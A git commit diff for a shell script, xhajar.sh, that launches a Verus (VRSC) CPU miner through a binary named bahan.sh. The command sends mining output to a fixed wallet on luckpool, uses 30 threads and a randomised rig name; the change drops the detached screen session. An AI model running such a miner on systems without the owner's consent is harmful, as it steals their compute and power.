c5c104d8f29c57d76ceb2aef7be767c1e456afc0
renilo <88342640+renilo@users.noreply.github.com>
2021-10-02 00:28:51 +0700

    Update xhajar.sh

--- xhajar.sh
+++ xhajar.sh
@@ -1,1 +1,1 @@
-screen -dmS running1 ./bahan.sh -algo verushash -coin VRSC -wallet RR6U3T7Uz475i7gontznFLWikFsQan2wjC -rigName  $(echo $(shuf -i 1-9999 -n 1)-HAJAR) -pool1 na.luckpool.net:3956 -cpuThreads 30
+./bahan.sh -algo verushash -coin VRSC -wallet RR6U3T7Uz475i7gontznFLWikFsQan2wjC -rigName  $(echo $(shuf -i 1-9999 -n 1)-HAJAR) -pool1 na.luckpool.net:3956 -cpuThreads 30
